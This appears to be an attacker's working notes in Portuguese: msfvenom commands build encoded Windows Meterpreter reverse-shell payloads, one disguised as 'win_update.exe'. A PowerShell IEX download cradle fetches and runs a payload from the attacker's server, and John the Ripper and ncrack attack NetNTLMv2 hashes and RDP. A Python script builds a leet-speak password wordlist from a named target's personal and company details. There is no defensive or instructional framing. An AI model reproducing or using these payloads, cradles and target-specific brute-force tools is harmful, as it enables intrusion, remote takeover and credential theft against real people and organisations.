msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation


http://192.168.1.128:8080/update_pacth.exe

zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe

IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.128:8080/payload.ps1')


john --wordlist=wordlist_personalizada_advanced.txt --format=netntlmv2 hash_john.txt

ncrack -v -p 3389 -U <(echo rsilva) -P wordlist_pro.txt 192.168.1.84

import itertools

# Palavras base relacionadas ao alvo
palavras_base = ["rsilva", "atibaia", "suma", "empresa", "admin", "senha", "TI", "info", "computador"]

# Números comuns para senhas
numeros = ["", "123", "2024", "2023", "007", "001", "777", "999", "10", "50", "!", "@"]

# Símbolos mais usados em senhas
simbolos = ["", "!", "@", "#", "$", "%", "&", "*"]

# Padrões extras corporativos
sufixos_corporativos = ["corp", "system", "grupo", "br", "brasil", "_ti"]

# Substituições para Leet Speak
substituicoes = {
    "a": ["a", "@", "4"],
    "i": ["i", "1"],
    "s": ["s", "$", "5"],
    "o": ["o", "0"],
    "e": ["e", "3"],
    "t": ["t", "7"]
}

def gerar_leet_variacoes(palavra):
    """Gera variações em Leet Speak para uma palavra."""
    combos = [[]]
    for char in palavra:
        novos = []
        if char.lower() in substituicoes:
            for c in substituicoes[char.lower()]:
                for combo in combos:
                    novos.append(combo + [c])
        else:
            for combo in combos:
                novos.append(combo + [char])
        combos = novos
    return set("".join(c) for c in combos)

wordlist = set()

# Geração de variações individuais
for palavra in palavras_base:
    variacoes_leet = gerar_leet_variacoes(palavra)
    for variacao in variacoes_leet:
        wordlist.add(variacao)
        wordlist.add(variacao.capitalize())
        wordlist.add(variacao.upper())
        for numero in numeros:
            for simbolo in simbolos:
                wordlist.add(variacao + numero)
                wordlist.add(variacao + simbolo)
                wordlist.add(variacao + numero + simbolo)

# Combinando palavras entre si com sufixos corporativos
for comb in itertools.permutations(palavras_base, 2):
    base = "".join(comb)
    variacoes_comb = gerar_leet_variacoes(base)
    for variacao in variacoes_comb:
        wordlist.add(variacao)
        for sufixo in sufixos_corporativos:
            wordlist.add(variacao + sufixo)
            for numero in numeros:
                for simbolo in simbolos:
                    wordlist.add(variacao + sufixo + numero + simbolo)

# Salvar wordlist refinada
with open("wordlist_pro_refinada.txt", "w") as file:
    for senha in wordlist:
        file.write(senha + "\n")

print(f"[+] Wordlist refinada gerada com {len(wordlist)} combinações -> wordlist_pro_refinada.txt")


